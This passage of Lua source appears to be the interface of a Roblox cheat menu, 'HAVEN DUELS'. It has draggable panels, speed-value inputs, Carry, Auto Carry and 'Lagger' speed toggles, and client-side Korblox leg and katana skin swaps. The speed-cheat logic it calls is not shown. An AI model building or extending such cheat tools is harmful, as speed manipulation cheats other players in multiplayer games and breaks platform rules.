            if isFloatingPanel then S._floatingPanelDragging = false end
            dragStart = inp.Position
            startPos = target.Position
        end
    end)
    UIS.InputChanged:Connect(function(inp)
        if S.lockUIEnabled or not dragging then return end
        if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
            local delta = inp.Position - dragStart
            if delta.Magnitude > 2 then
                moved = true
                local newX = startPos.X.Offset + delta.X
                local newY = startPos.Y.Offset + delta.Y
                target.Position = UDim2.new(startPos.X.Scale, newX, startPos.Y.Scale, newY)
                if onMove then pcall(onMove, target) end
                if isFloatingPanel then S._floatingPanelDragging = true end
            end
        end
    end)
    UIS.InputEnded:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
            if isFloatingPanel and moved then saveConfig() end
            dragging = false
            moved = false
            if isFloatingPanel then
                task.delay(0.12, function()
                    S._floatingPanelDragging = false
                end)
            end
        end
    end)
end

-- ===========================
-- ===========================
-- HAVEN DUELS — VERTICAL GUI  (black / grey / red / white)
-- ===========================

-- ── Palette (Premium Glassmorphism) ──────────────────────────────────────
C_BG       = Color3.fromRGB(8, 8, 8)
C_HEADER   = Color3.fromRGB(12, 12, 12)
C_CARD     = Color3.fromRGB(16, 16, 16)
C_CARD_HOV = Color3.fromRGB(28, 28, 28)
C_BORDER   = Color3.fromRGB(40, 40, 40)
C_HIGHLIGHT      = Color3.fromRGB(190, 95, 255)
C_SHADE  = Color3.fromRGB(83, 83, 83)
C_HIGHLIGHT_BRIGHT = Color3.fromRGB(235, 205, 255)
C_WHITE    = Color3.fromRGB(245, 245, 245)
C_GREY     = Color3.fromRGB(160, 160, 160)
C_DIM      = Color3.fromRGB(72, 72, 72)
C_ACCENT   = Color3.fromRGB(166, 166, 166)
C_SEPARATOR_GRAY = Color3.fromRGB(128, 128, 128)
C_CARD_ACTIVE_BG = Color3.fromRGB(25, 25, 25)

PANEL_W  = 310
PANEL_H  = 560
HEADER_H = 86
TABBAR_H = 42

-- ── Scrolling page factory ────────────────────────────────────────────────
local function buildGui_createScrollingPages(parent)
    local pages = {}
    for _, n in ipairs({"Speed","Main","Move","Config","Keybinds"}) do
        local sf = Instance.new("ScrollingFrame", parent)
        sf.Size = UDim2.new(1,0,1,0)
        sf.BackgroundTransparency = 1
        sf.BorderSizePixel = 0
        sf.ScrollBarThickness = 3
        sf.ScrollBarImageColor3 = C_HIGHLIGHT
        sf.Visible = false
        sf.AutomaticCanvasSize = Enum.AutomaticSize.Y
        sf.CanvasSize = UDim2.new(0,0,0,0)
        pcall(function() sf.ElasticBehavior = Enum.ElasticBehavior.Always end)
        pcall(function() sf.ScrollingDirection = Enum.ScrollingDirection.Y end)
        local ll = Instance.new("UIListLayout", sf)
        ll.SortOrder = Enum.SortOrder.LayoutOrder
        ll.Padding = UDim.new(0,4)
        ll.FillDirection = Enum.FillDirection.Vertical
        local pp = Instance.new("UIPadding", sf)
        pp.PaddingLeft  = UDim.new(0,10)
        pp.PaddingRight = UDim.new(0,10)
        pp.PaddingTop   = UDim.new(0,8)
        pp.PaddingBottom= UDim.new(0,18)
        pages[n] = sf
    end
    return pages
end

rowCounts = {Speed=0, Main=0, Move=0, Config=0, Keybinds=0}

-- ── Card row ──────────────────────────────────────────────────────────────
local function mkCard(pg, pages, h)
    rowCounts[pg] = rowCounts[pg] + 1
    local f = Instance.new("Frame", pages[pg])
    f.Size = UDim2.new(1,0,0,h or 38)
    f.BackgroundColor3 = C_CARD
    f.BackgroundTransparency = 0.15
    f.BorderSizePixel = 0
    f.LayoutOrder = rowCounts[pg]
    Instance.new("UICorner", f).CornerRadius = UDim.new(0,12)
    local stroke = Instance.new("UIStroke", f)
    stroke.Color = C_BORDER; stroke.Thickness = 1; stroke.Transparency = 0.3
    -- Subtle inner glow gradient
    local cardGrad = Instance.new("UIGradient", f)
    cardGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(24, 24, 24)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(16, 16, 16)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 20)),
    })
    cardGrad.Rotation = 135
    return f
end

-- ── Section divider ───────────────────────────────────────────────────────
local function mkSection(pg, pages, text)
    rowCounts[pg] = rowCounts[pg] + 1
    local f = Instance.new("Frame", pages[pg])
    f.Size = UDim2.new(1,0,0,20)
    f.BackgroundTransparency = 1
    f.BorderSizePixel = 0
    f.LayoutOrder = rowCounts[pg]
    local lbl = Instance.new("TextLabel", f)
    lbl.Size = UDim2.new(1,-10,1,0)
    lbl.Position = UDim2.new(0,10,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = text:upper()
    lbl.TextColor3 = C_HIGHLIGHT
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 9
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    local line = Instance.new("Frame", f)
    line.Size = UDim2.new(1,-10,0,1)
    line.Position = UDim2.new(0,10,1,-1)
    line.BackgroundColor3 = C_SEPARATOR_GRAY
    line.BackgroundTransparency = 0.72
    line.BorderSizePixel = 0
end

-- ── Toggle row ────────────────────────────────────────────────────────────
local function mkToggle(pg, pages, label, defKey, defOn, onToggle, onKeyChanged)
    local card = mkCard(pg, pages, 36)
    local cardStroke = card:FindFirstChildOfClass("UIStroke")

    local lbl = Instance.new("TextLabel", card)
    lbl.Size = UDim2.new(0,136,1,0)
    lbl.Position = UDim2.new(0,12,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = label
    lbl.TextColor3 = C_WHITE
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 11
    lbl.TextXAlignment = Enum.TextXAlignment.Left

    local keyBtn = nil
    if defKey then
        keyBtn = Instance.new("TextButton", card)
        keyBtn.Size = UDim2.new(0,54,0,28)
        keyBtn.Position = UDim2.new(1,-58,0.5,-14)
        keyBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        keyBtn.BackgroundTransparency = 0
        keyBtn.BorderSizePixel = 0
        keyBtn.ZIndex = 10
        keyBtn.Text = (defKey or Enum.KeyCode.Unknown).Name
        keyBtn.TextColor3 = C_GREY
        keyBtn.Font = Enum.Font.GothamBold; keyBtn.TextSize = 9
        Instance.new("UICorner", keyBtn).CornerRadius = UDim.new(0,8)
        local ks = Instance.new("UIStroke", keyBtn)
        ks.Color = Color3.fromRGB(34, 34, 40)
        ks.Thickness = 1
        ks.Transparency = 0.52
        ks.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        local listening = false
        keyBtn.MouseButton1Click:Connect(function()
            if listening then return end; listening = true
            local prev = keyBtn.Text; keyBtn.Text = "···"; keyBtn.TextColor3 = C_HIGHLIGHT
            local conn
            conn = UIS.InputBegan:Connect(function(inp)
                if inp.UserInputType == Enum.UserInputType.Keyboard or inp.UserInputType == Enum.UserInputType.Gamepad1 then
                    if inp.KeyCode ~= Enum.KeyCode.Escape then
                        keyBtn.Text = inp.KeyCode.Name; keyBtn.TextColor3 = C_GREY
                        if onKeyChanged then onKeyChanged(inp.KeyCode, inp.UserInputType == Enum.UserInputType.Gamepad1) end
                    else keyBtn.Text = prev; keyBtn.TextColor3 = C_GREY end
                    listening = false; conn:Disconnect()
                end
            end)
        end)
    end

    -- Interruptor estilo HAVEN DUELS: perilla centrada gris apagada y morada encendida.
    local pillBg = Instance.new("Frame", card)
    pillBg.Size = UDim2.new(0,36,1,0)
    pillBg.AnchorPoint = Vector2.new(1,0.5)
    pillBg.Position = UDim2.new(1,-18,0.5,0)
    pillBg.BackgroundColor3 = Color3.fromRGB(18,18,24)
    pillBg.BackgroundTransparency = 1
    pillBg.BorderSizePixel = 0
    pillBg.ZIndex = 6
    pillBg.ClipsDescendants = false
    Instance.new("UICorner", pillBg).CornerRadius = UDim.new(1,0)
    local pillStroke = Instance.new("UIStroke", pillBg)
    pillStroke.Name = "TrackStroke"
    pillStroke.Color = Color3.fromRGB(190,120,255)
    pillStroke.Thickness = 0
    pillStroke.Transparency = 1
    local pillGradient = Instance.new("UIGradient", pillBg)
    pillGradient.Name = "TrackGradient"
    pillGradient.Rotation = 90
    pillGradient.Enabled = true
    pillGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(44,44,54)),
        ColorSequenceKeypoint.new(0.55, Color3.fromRGB(24,24,45)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(12,12,16)),
    })
    local dotBack = Instance.new("Frame", pillBg)
    dotBack.Name = "DotBack"
    dotBack.AnchorPoint = Vector2.new(0.5,0.5)
    dotBack.Position = UDim2.new(0.5,0,0.5,1)
    dotBack.Size = UDim2.new(0,15,0,15)
    dotBack.BackgroundColor3 = Color3.fromRGB(0,0,0)
    dotBack.BackgroundTransparency = 0.55
    dotBack.BorderSizePixel = 0
    dotBack.ZIndex = 6
    Instance.new("UICorner", dotBack).CornerRadius = UDim.new(1,0)
    local dot = Instance.new("Frame", pillBg)
    dot.Name = "Knob"
    dot.AnchorPoint = Vector2.new(0.5,0.5)
    dot.Position = UDim2.new(0.5,0,0.5,0)
    dot.Size = UDim2.new(0,13,0,13)
    dot.BackgroundColor3 = Color3.fromRGB(92,92,104)
    dot.BorderSizePixel = 0
    dot.ZIndex = 7
    Instance.new("UICorner", dot).CornerRadius = UDim.new(1,0)
    local dotGradient = Instance.new("UIGradient", dot)
    dotGradient.Name = "VisionDotGradient"
    dotGradient.Rotation = 90
    dotGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(235,232,248)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(128,124,150)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(48,48,58)),
    })
    local dotGloss = Instance.new("Frame", dot)
    dotGloss.Name = "VisionPurpleGloss"
    dotGloss.Size = UDim2.new(0.46,0,0.24,0)
    dotGloss.Position = UDim2.new(0.22,0,0.11,0)
    dotGloss.BackgroundColor3 = Color3.fromRGB(255,255,255)
    dotGloss.BackgroundTransparency = 0.62
    dotGloss.BorderSizePixel = 0
    dotGloss.ZIndex = 8
    Instance.new("UICorner", dotGloss).CornerRadius = UDim.new(1,0)
    local dotScale = Instance.new("UIScale", dot)
    dotScale.Scale = 1

    local isOn = defOn or false
    local function setV(on)
        isOn = on
        local fadeInfo = TweenInfo.new(0.22,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
        local dotColor = on and Color3.fromRGB(235,120,255) or Color3.fromRGB(92,92,104)
        local dotSequence = on and ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255,230,255)),
            ColorSequenceKeypoint.new(0.46, Color3.fromRGB(235,120,255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(154,62,230)),
        }) or ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(235,232,248)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(128,124,150)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(48,48,58)),
        })
        TS_G:Create(dot, fadeInfo, {BackgroundColor3 = dotColor}):Play()
        dotGradient.Color = dotSequence
        TS_G:Create(dotScale, TweenInfo.new(0.28,Enum.EasingStyle.Back,Enum.EasingDirection.Out), {
            Scale = on and 1.08 or 0.92,
        }):Play()
        task.delay(0.02, function()
            if dotScale and dotScale.Parent then
                TS_G:Create(dotScale, TweenInfo.new(0.28,Enum.EasingStyle.Back,Enum.EasingDirection.Out), {Scale = 1}):Play()
            end
        end)
        dotGloss.BackgroundTransparency = on and 0.5 or 0.62
        pillGradient.Enabled = true
        if cardStroke then
            TS_G:Create(cardStroke, fadeInfo, {Color = C_BORDER, Transparency = 0.55}):Play()
        end
    end

    local clickArea = Instance.new("TextButton", card)
    clickArea.Size = UDim2.new(1,0,1,0)
    clickArea.BackgroundTransparency = 1; clickArea.Text = ""; clickArea.ZIndex = 8
    clickArea.MouseButton1Click:Connect(function()
        isOn = not isOn; setV(isOn)
        if onToggle then onToggle(isOn) end
    end)
    clickArea.MouseEnter:Connect(function()
        TS_G:Create(card, TweenInfo.new(0.12), {BackgroundColor3 = C_CARD_HOV}):Play()
    end)
    clickArea.MouseLeave:Connect(function()
        TS_G:Create(card, TweenInfo.new(0.15), {BackgroundColor3 = C_CARD}):Play()
    end)

    setV(isOn)
    return setV, keyBtn
end

-- ── Number input row ──────────────────────────────────────────────────────
local function mkInput(pg, pages, label, default, onChange)
    local card = mkCard(pg, pages, 36)
    local lbl = Instance.new("TextLabel", card)
    lbl.Size = UDim2.new(0.55,-8,1,0); lbl.Position = UDim2.new(0,12,0,0)
    lbl.BackgroundTransparency = 1; lbl.Text = label
    lbl.TextColor3 = C_WHITE; lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 11; lbl.TextXAlignment = Enum.TextXAlignment.Left
    local box = Instance.new("TextBox", card)
    box.Size = UDim2.new(0,66,0,26); box.Position = UDim2.new(1,-74,0.5,-13)
    box.BackgroundColor3 = Color3.fromRGB(18, 18, 18); box.BorderSizePixel = 0
    box.Text = tostring(default); box.TextColor3 = C_WHITE
    box.Font = Enum.Font.GothamBlack; box.TextSize = 11
    box.ClearTextOnFocus = false; box.MultiLine = false
    pcall(function() box.ReturnKeyType = Enum.ReturnKeyType.Done end)
    Instance.new("UICorner", box).CornerRadius = UDim.new(0,8)
    local boxStroke = Instance.new("UIStroke", box)
    boxStroke.Color = C_BORDER; boxStroke.Thickness = 0.8
    local lastVal = tostring(default); local isFocused = false
    box.Focused:Connect(function()
        isFocused = true
        TS_G:Create(boxStroke, TweenInfo.new(0.15), {Color = C_HIGHLIGHT}):Play()
    end)
    local function applyVal()
        if not isFocused then return end
        isFocused = false
        TS_G:Create(boxStroke, TweenInfo.new(0.15), {Color = C_BORDER}):Play()
        local n = tonumber(box.Text)
        if n then lastVal = tostring(n); box.Text = lastVal; onChange(n)
        else box.Text = lastVal end
        pcall(function() box:ReleaseFocus(false) end)
    end
    box.FocusLost:Connect(function()
        if isFocused then
            isFocused = false
            TS_G:Create(boxStroke, TweenInfo.new(0.15), {Color = C_BORDER}):Play()
            local n = tonumber(box.Text)
            if n then lastVal = tostring(n); box.Text = lastVal; onChange(n)
            else box.Text = lastVal end
        end
    end)
    pcall(function() box.ReturnPressedFromOnScreenKeyboard:Connect(applyVal) end)
    UIS.TouchTap:Connect(function(positions)
        if not isFocused then return end
        pcall(function()
            local abs = box.AbsolutePosition; local sz = box.AbsoluteSize; local tp = positions[1]
            if tp and not (tp.X>=abs.X and tp.X<=abs.X+sz.X and tp.Y>=abs.Y and tp.Y<=abs.Y+sz.Y) then
                applyVal()
            end
        end)
    end)
    return box
end

-- ── Action / keybind row ──────────────────────────────────────────────────
local function mkActionRow(pg, pages, labelText, keyEntry, onRun)
    local card = mkCard(pg, pages, 36)
    local lbl = Instance.new("TextLabel", card)
    lbl.Size = UDim2.new(0,180,1,0); lbl.Position = UDim2.new(0,12,0,0)
    lbl.BackgroundTransparency = 1; lbl.Text = labelText
    lbl.TextColor3 = C_WHITE; lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 11
    lbl.TextXAlignment = Enum.TextXAlignment.Left

    -- Toda la fila ejecuta la acción al tocarla; el botón de tecla sigue permitiendo reasignarla.
    if onRun then
        local actionTap = Instance.new("TextButton", card)
        actionTap.Name = "ActionTapArea"
        actionTap.Size = UDim2.new(1, 0, 1, 0)
        actionTap.BackgroundTransparency = 1
        actionTap.Text = ""
        actionTap.AutoButtonColor = false
        actionTap.Active = true
        actionTap.ZIndex = 2
        actionTap.Activated:Connect(function()
            task.spawn(onRun)
        end)
    end

    if keyEntry then
        local keyBtn = Instance.new("TextButton", card)
        keyBtn.Size = UDim2.new(0,52,0,24); keyBtn.Position = UDim2.new(1,-62,0.5,-12)
        keyBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 18); keyBtn.BorderSizePixel = 0; keyBtn.ZIndex = 10
        keyBtn.Text = (keyEntry.kb or keyEntry.gp or Enum.KeyCode.Unknown).Name
        keyBtn.TextColor3 = C_GREY; keyBtn.Font = Enum.Font.GothamBold; keyBtn.TextSize = 9
        Instance.new("UICorner", keyBtn).CornerRadius = UDim.new(0,7)
        local ks = Instance.new("UIStroke", keyBtn); ks.Color = C_BORDER; ks.Thickness = 0.8
        local listening = false
        keyBtn.MouseButton1Click:Connect(function()
            if listening then return end; listening = true
            local prev = keyBtn.Text; keyBtn.Text = "···"; keyBtn.TextColor3 = C_HIGHLIGHT
            local conn
            conn = UIS.InputBegan:Connect(function(inp)
                if inp.UserInputType == Enum.UserInputType.Keyboard or inp.UserInputType == Enum.UserInputType.Gamepad1 then
                    if inp.KeyCode ~= Enum.KeyCode.Escape then
                        keyBtn.Text = inp.KeyCode.Name; keyBtn.TextColor3 = C_GREY
                        if inp.UserInputType == Enum.UserInputType.Gamepad1 then
                            keyEntry.gp = inp.KeyCode; keyEntry.kb = nil
                        else keyEntry.kb = inp.KeyCode; keyEntry.gp = nil end
                        saveConfig()
                    else keyBtn.Text = prev; keyBtn.TextColor3 = C_GREY end
                    listening = false; conn:Disconnect()
                end
            end)
        end)
    end
    return function(newLabel)
        if lbl and lbl.Parent then lbl.Text = newLabel end
    end
end

-- ── Mini toggle (minimised button) ────────────────────────────────────────
local function buildGui_createMiniToggle(gui, showGuiFn)
    local btn = Instance.new("TextButton", gui)
    btn.Name = "MiniToggle"
    btn.Size = UDim2.new(0,152,0,40)
    btn.Position = UDim2.new(0,18,0,60)
    btn.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
    btn.BackgroundTransparency = 0.02
    btn.BorderSizePixel = 0
    btn.Text = ""
    btn.AutoButtonColor = false
    btn.ZIndex = 20
    btn.Visible = false
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,16)
    local ms = Instance.new("UIStroke", btn)
    ms.Color = C_HIGHLIGHT
    ms.Thickness = 1
    ms.Transparency = 0.45
    local titleIcon = Instance.new("TextLabel", btn)
    titleIcon.Name = "MiniTitleText"
    titleIcon.AnchorPoint = Vector2.new(0.5, 0.5)
    titleIcon.Position = UDim2.new(0.5, 0, 0.5, 0)
    titleIcon.Size = UDim2.new(1, -12, 1, -4)
    titleIcon.BackgroundTransparency = 1
    titleIcon.Text = "HAVEN DUELS"
    titleIcon.Font = Enum.Font.GothamBlack
    titleIcon.TextSize = 21
    titleIcon.TextScaled = false
    titleIcon.TextColor3 = Color3.fromRGB(210, 150, 255)
    titleIcon.TextStrokeTransparency = 0.25
    titleIcon.TextStrokeColor3 = Color3.fromRGB(55, 15, 85)
    titleIcon.ZIndex = 21
    local titleGrad = Instance.new("UIGradient", titleIcon)
    titleGrad.Rotation = 90
    titleGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 235, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(210, 150, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(145, 55, 225)),
    })
    makeDraggable(btn, false)
    btn.MouseButton1Click:Connect(showGuiFn)
    return btn
end

-- ── Kroblox (ported from Ace Duels) ────────────────────────────────────────
_G._VisionKrobloxMode = _G._VisionKrobloxMode or "Off"
VISION_KROBLOX_ASSETS = {
    ["Left Leg"] = {
        id = "rbxassetid://139607673", targetBodyPart = "LeftUpperLeg",
        partsToHide = {"LeftUpperLeg", "LeftLowerLeg", "LeftFoot"},
        scale = Vector3.new(1, 1, 1), audio = "rbxassetid://87998522263554",
        offset = CFrame.new(0, 0, 0) * CFrame.Angles(1.2, 0, 0),
    },
    ["Right Leg"] = {
        id = "rbxassetid://139607718", targetBodyPart = "RightUpperLeg",
        partsToHide = {"RightUpperLeg", "RightLowerLeg", "RightFoot"},
        scale = Vector3.new(1, 1, 1), audio = "rbxassetid://135315310485417",
        offset = CFrame.new(0, 0, 0) * CFrame.Angles(0, 1.2, 0),
    },
}
local function clearVisionKroblox()
    local character = LP.Character
    if not character then return end
    for _, name in ipairs({"Korblox_LeftLeg", "Korblox_RightLeg", "VisionKroblox_LeftLeg", "VisionKroblox_RightLeg"}) do
        local object = character:FindFirstChild(name)
        if object then pcall(function() object:Destroy() end) end
    end
    for _, name in ipairs({"LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "RightUpperLeg", "RightLowerLeg", "RightFoot"}) do
        local part = character:FindFirstChild(name)
        if part and part:IsA("BasePart") then
            part.Transparency = 0
            part.LocalTransparencyModifier = 0
        end
    end
end

local function attachVisionKroblox(whichLeg)
    local data = VISION_KROBLOX_ASSETS[whichLeg]
    local character = LP.Character
    if not data or not character then return false end
    local target = character:FindFirstChild(data.targetBodyPart)
    if not target then return false end
    local old = character:FindFirstChild("Korblox_" .. whichLeg:gsub("%s+", ""))
    if old then old:Destroy() end
    for _, name in ipairs(data.partsToHide) do
        local part = character:FindFirstChild(name)
        if part and part:IsA("BasePart") then part.Transparency = 1 end
    end
    local ok, objects = pcall(function() return game:GetObjects(data.id) end)
    if not ok or not objects or #objects == 0 then return false end
    local object = objects[1]
    object.Name = "Korblox_" .. whichLeg:gsub("%s+", "")
    local meshPart = object:IsA("BasePart") and object or object:FindFirstChildWhichIsA("BasePart", true)
    if not meshPart then pcall(function() object:Destroy() end); return false end
    meshPart.Size = meshPart.Size * data.scale
    meshPart.CanCollide = false
    meshPart.CanTouch = false
    meshPart.CanQuery = false
    meshPart.Massless = true
    meshPart.CFrame = target.CFrame * data.offset
    local weld = Instance.new("WeldConstraint")
    weld.Part0 = target
    weld.Part1 = meshPart
    weld.Parent = meshPart
    object.Parent = character
    return true
end

_G._VisionApplyKroblox = function(mode)
    mode = ({Off=true, Left=true, Right=true, Both=true})[mode] and mode or "Off"
    clearVisionKroblox()
    S.krobloxMode = mode
    _G._VisionKrobloxMode = mode
    if mode == "Left" or mode == "Both" then pcall(attachVisionKroblox, "Left Leg") end
    if mode == "Right" or mode == "Both" then pcall(attachVisionKroblox, "Right Leg") end
end

LP.CharacterAdded:Connect(function()
    task.wait(0.6)
    if _G._VisionKrobloxMode ~= "Off" then
        pcall(_G._VisionApplyKroblox, _G._VisionKrobloxMode)
    end
end)

-- ── Tab content builders ──────────────────────────────────────────────────
local function buildSpeedTab(pages)
    mkSection("Speed", pages, "Speed Values")
    S.normalBox  = mkInput("Speed", pages, "Normal Speed",   S.NS, function(v)
        if v>0 and v<=500 then S.NS=v; S.applySpeedVelocityNow(); S.restartMovement(); saveConfig() end end)
    S.carryBox   = mkInput("Speed", pages, "Carry Speed",    S.CS, function(v)
        if v>0 and v<=500 then S.CS=v; S.applySpeedVelocityNow(); S.restartMovement(); saveConfig() end end)
    S.laggerBox  = mkInput("Speed", pages, "Lagger Normal Speed", S.LS, function(v)
        if v>0 and v<=500 then S.LS=v; S.applySpeedVelocityNow(); S.restartMovement(); saveConfig() end end)
    S.laggerCarryBox = mkInput("Speed", pages, "Lagger Carry Speed", S.LCS, function(v)
        if v>0 and v<=500 then S.LCS=v; S.applySpeedVelocityNow(); S.restartMovement(); saveConfig() end end)
    mkSection("Speed", pages, "Modes")
    S.speedClk, _ = mkToggle("Speed", pages, "Carry Mode", S.KB.SpeedToggle.kb, S.speedMode, function(on)
        if on and S.laggerMode~=0 then S.laggerMode=0; if S.setLaggerVisual then S.setLaggerVisual(false) end; updateLaggerButtonVisual() end
        S.speedMode = on
        if on then S.setCarrySpeedMode() else S.setNormalSpeedMode() end
        S.restartMovement(); updateFloatingButtons(); saveConfig()
    end, function(k,isGp)
        if isGp then S.KB.SpeedToggle.gp=k; S.KB.SpeedToggle.kb=nil
        else S.KB.SpeedToggle.kb=k; S.KB.SpeedToggle.gp=nil end; saveConfig()
    end)
    S.autoCarrySetVisual, _ = mkToggle("Speed", pages, "Auto Carry", nil, S.autoCarryEnabled, function(on)
        S.autoCarryEnabled = on
        if not on then
            S.autoCarryPending = false
            pcall(autoCarryStop)
        end
        saveConfig()
    end, nil)
    S.setLaggerVisual, _ = mkToggle("Speed", pages, "Lagger Mode", S.KB.LaggerToggle.kb, S.laggerMode ~= 0, function(on)
        if on then
            if S.speedClk then S.speedClk(false) end
            S.setLaggerNormalMode()
        else
            S.setLaggerOffMode()
        end
        updateLaggerButtonVisual(); S.restartMovement(); updateFloatingButtons(); saveConfig()
    end, function(k,isGp)
        if isGp then S.KB.LaggerToggle.gp=k; S.KB.LaggerToggle.kb=nil
        else S.KB.LaggerToggle.kb=k; S.KB.LaggerToggle.gp=nil end; saveConfig()
    end)
end

-- ==================== VISION BAT SKINS ====================
do
-- Ported from Zurich: Epic Katana and Bloody Katana, including their slash sounds.
VisionBatSkin = {}
VISION_BAT_SKINS = {
    {name = "Off"},
    {
        name = "Epic Katana",
        id = "rbxassetid://14052995337",
        soundId = "rbxassetid://111808555599832",
        c0 = CFrame.new(0, 0, 1.6) * CFrame.Angles(0, 0, math.rad(-90)),
    },
    {
        name = "Bloody Katana",
        id = "rbxassetid://126653333198410",
        soundId = "rbxassetid://111808555599832",
        c0 = CFrame.new(0, 0, 2) * CFrame.Angles(math.rad(90), 0, 0),
    },
}
VisionBatSkin.cache = {}
VisionBatSkin.originals = setmetatable({}, {__mode = "k"})
VisionBatSkin.soundConnections = setmetatable({}, {__mode = "k"})
VisionBatSkin.watched = setmetatable({}, {__mode = "k"})

function VisionBatSkin.visionLoadBatSkin(id)
    if VisionBatSkin.cache[id] then return VisionBatSkin.cache[id] end
    local ok, objects = pcall(function() return game:GetObjects(id) end)
    if not ok or type(objects) ~= "table" or #objects == 0 then return nil end
    VisionBatSkin.cache[id] = objects[1]
    return objects[1]
end

function VisionBatSkin.visionIsBat(tool)
    return tool and tool:IsA("Tool") and tool.Name:lower() == "bat"
end

function VisionBatSkin.visionSetBatSlashSound(tool, soundId)
    if not tool then return end
    for _, sound in ipairs(tool:GetDescendants()) do
        if sound:IsA("Sound") and sound.Name == "Slash" then
            local original = sound:GetAttribute("VisionOriginalSlashSound")
            if soundId then
                if original == nil then sound:SetAttribute("VisionOriginalSlashSound", sound.SoundId) end
                sound.SoundId = soundId
            elseif original ~= nil then
                sound.SoundId = original
                sound:SetAttribute("VisionOriginalSlashSound", nil)
            end
        end
    end
end

function VisionBatSkin.visionRestoreBatSkin(tool, clearOriginal)
    if not VisionBatSkin.visionIsBat(tool) then return end
    local handle = tool:FindFirstChild("Handle")
    local original = VisionBatSkin.originals[tool]
    if handle then
        -- En Off no debe quedar visible ningún modelo, weld o parte de la skin.
        for _, child in ipairs(handle:GetChildren()) do
            if not child:IsA("Sound") then
                pcall(function() child:Destroy() end)
            end
        end
    end
    if handle and original then
        handle.Transparency = original.transparency
        handle.CanCollide = original.canCollide
        handle.CanTouch = original.canTouch
        handle.CanQuery = original.canQuery
        handle.Size = original.size
    elseif handle then
        handle.Transparency = 0
    end
    if original and original.grip then tool.Grip = original.grip end
    VisionBatSkin.visionSetBatSlashSound(tool, nil)
    local soundConnection = VisionBatSkin.soundConnections[tool]
    if clearOriginal ~= false and soundConnection then
        pcall(function() soundConnection:Disconnect() end)
        VisionBatSkin.soundConnections[tool] = nil
    end
    if clearOriginal ~= false then VisionBatSkin.originals[tool] = nil end
end

function VisionBatSkin.visionPrepareBatSkin(tool, entry)
    if not VisionBatSkin.visionIsBat(tool) or not entry or not entry.id then return end
    local toolHandle = tool:FindFirstChild("Handle")
    if not toolHandle then return end

    if not VisionBatSkin.originals[tool] then
        VisionBatSkin.originals[tool] = {
            grip = tool.Grip,
            transparency = toolHandle.Transparency,
            canCollide = toolHandle.CanCollide,
            canTouch = toolHandle.CanTouch,
            canQuery = toolHandle.CanQuery,
            size = toolHandle.Size,
        }
    end

    VisionBatSkin.visionRestoreBatSkin(tool, false)
    for _, child in ipairs(toolHandle:GetChildren()) do
        if not child:IsA("Sound") then pcall(function() child:Destroy() end) end
    end

    local katanaRoot = VisionBatSkin.visionLoadBatSkin(entry.id)
    if not katanaRoot then return end
    local modelClone = katanaRoot:Clone()
    modelClone.Name = "VisionBatSkinModel"
    modelClone.Parent = toolHandle

    local function makeKinematic(inst)
        if inst:IsA("BasePart") then
            inst.Anchored = false
            inst.CanCollide = false
            inst.Massless = true
        end
        for _, child in ipairs(inst:GetChildren()) do makeKinematic(child) end
    end
    makeKinematic(modelClone)

    local primaryPart = modelClone:IsA("BasePart") and modelClone or modelClone.PrimaryPart
    if not primaryPart then
        for _, inst in ipairs(modelClone:GetDescendants()) do
            if inst:IsA("BasePart") then primaryPart = inst; break end
        end
    end
    if not primaryPart then pcall(function() modelClone:Destroy() end); return end

    local weld = Instance.new("Weld")
    weld.Part0 = toolHandle
    weld.Part1 = primaryPart
    weld.C0 = entry.c0
    weld.Parent = toolHandle

    toolHandle.Transparency = 1
    toolHandle.CanCollide = false
    toolHandle.Size = Vector3.new(0.3, 1, 0.3)
    tool.GripForward = Vector3.new(0, -1, 0)
    tool.GripRight   = Vector3.new(1,  0, 0)
    tool.GripUp      = Vector3.new(0,  0, 1)
    tool.GripPos     = Vector3.new(0,  0, 0)

    local previousSoundConnection = VisionBatSkin.soundConnections[tool]
    if previousSoundConnection then
        pcall(function() previousSoundConnection:Disconnect() end)
        VisionBatSkin.soundConnections[tool] = nil
    end
    VisionBatSkin.visionSetBatSlashSound(tool, entry.soundId)
    VisionBatSkin.soundConnections[tool] = tool.DescendantAdded:Connect(function(obj)
        if S.batSkinMode == entry.name and obj:IsA("Sound") and obj.Name == "Slash" then
            if obj:GetAttribute("VisionOriginalSlashSound") == nil then
                obj:SetAttribute("VisionOriginalSlashSound", obj.SoundId)
            end
            obj.SoundId = entry.soundId
        end
    end)
end

function VisionBatSkin.visionApplyBatSkin(tool)
    if not VisionBatSkin.visionIsBat(tool) then return end
    if S.batSkinMode == "Off" then
        VisionBatSkin.visionRestoreBatSkin(tool)
        return
    end
